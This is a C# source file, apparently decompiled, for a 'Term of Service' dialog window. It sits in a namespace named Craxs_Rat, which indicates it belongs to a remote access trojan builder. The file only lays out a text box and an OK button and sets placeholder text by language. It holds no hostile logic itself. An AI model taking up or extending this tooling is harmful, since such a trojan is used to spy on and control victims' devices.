using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Dialog2 : Form
{
	private IContainer components;

	[CompilerGenerated]
	[AccessedThroughProperty("Button1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _Button1;

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				button.Click -= value2;
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public Dialog2()
	{
		base.Load += Dialog2_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.TextBox1 = new System.Windows.Forms.TextBox();
		this.Button1 = new System.Windows.Forms.Button();
		base.SuspendLayout();
		this.TextBox1.BackColor = System.Drawing.Color.Black;
		this.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.TextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TextBox1.Font = new System.Drawing.Font("Times New Roman", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBox1.ForeColor = System.Drawing.Color.White;
		this.TextBox1.Location = new System.Drawing.Point(0, 0);
		this.TextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.TextBox1.Multiline = true;
		this.TextBox1.Name = "TextBox1";
		this.TextBox1.ReadOnly = true;
		this.TextBox1.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.TextBox1.Size = new System.Drawing.Size(1164, 344);
		this.TextBox1.TabIndex = 0;
		this.Button1.BackColor = System.Drawing.Color.Black;
		this.Button1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Button1.Font = new System.Drawing.Font("Times New Roman", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Button1.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Button1.Location = new System.Drawing.Point(0, 344);
		this.Button1.Margin = new System.Windows.Forms.Padding(4);
		this.Button1.Name = "Button1";
		this.Button1.Size = new System.Drawing.Size(1164, 63);
		this.Button1.TabIndex = 1;
		this.Button1.Text = "OK";
		this.Button1.UseVisualStyleBackColor = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(50, 50, 50);
		base.ClientSize = new System.Drawing.Size(1164, 407);
		base.Controls.Add(this.TextBox1);
		base.Controls.Add(this.Button1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Margin = new System.Windows.Forms.Padding(4);
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "Dialog2";
		base.ShowIcon = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Term of Service";
		base.TopMost = true;
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Close();
	}

	public void CraxsStyle()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				TextBox1.Text = "1";
			}
			else
			{
				TextBox1.Text = "1";
			}
		}
		else
		{
			TextBox1.Text = "1";
		}
	}

	private void Dialog2_Load(object sender, EventArgs e)
	{
		CraxsStyle();
	}
}
